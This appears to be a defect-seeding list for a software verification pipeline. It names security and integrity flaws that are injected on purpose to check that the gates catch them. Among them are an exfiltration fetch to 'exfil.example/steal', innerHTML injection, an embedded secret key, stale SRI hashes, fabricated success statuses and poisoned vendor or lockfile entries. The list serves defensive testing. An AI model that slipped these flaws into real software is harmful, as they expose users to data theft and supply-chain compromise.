note: The standing calibration corpus (mandate S12 / §9.3). Seeded defect classes the pipeline must catch. The heartbeat re-injects these on a schedule; a class the pipeline stops catching is a FAILED GATE and freezes releases. Corpus grows with every real defect found and every incident (§9.9). Track C seeds (D7-D9) added at catalogue v2.0 per Part 2 Phase 2': an exfiltration path, an unattested shipped-component change, and a personal-data/telemetry sink. | v2.0+: D10 (lockfile/registry drift) added with the C-03 harness-pinning close. | compiled-ahead: D11 (vendor drift), D12 (compiled stale), D13 (unpkg/Babel reintroduced).

defects.inject: embed a bg_live_sk_/X-API-Key secret idiom in bubblegauge.jsx
weaken KEY_RE re-validation before base-URL construction
bump a pinned CDN version (e.g. react@18.3.2) leaving stale SRI
make a catch handler return a fabricated 2xx status
render API text via dangerouslySetInnerHTML/.innerHTML in src/bubblegauge.tsx
add a fetch or rendered link to a non-allowlisted host (e.g. fetch('https://exfil.example/steal')) in a served file
change a shipped component's bytes (e.g. edit bubblegauge.jsx) without regenerating governance/provenance-manifest.json
add a runtime AI/telemetry sink or a PII-capturing input (navigator.sendBeacon, gtag(), type=password, localStorage) to a served file
point a verify/package-lock.json dependency at a non-registry URL, drop its integrity, or range-pin a devDependency (^/~)
tamper a byte of a ./vendor/*.js file (swapped/poisoned library)

change USED code in src/dashboard.tsx (e.g. a rendered label/number) or hand-edit dashboard.js without rebuilding — served .js diverges from source (note: dead-code edits are tree-shaken away and are not drift)
add an unpkg <script> or a type=text/babel tag back into index.html
introduce a type error in the typed core (e.g. pass a string where src/lib/math.ts expects a number[])
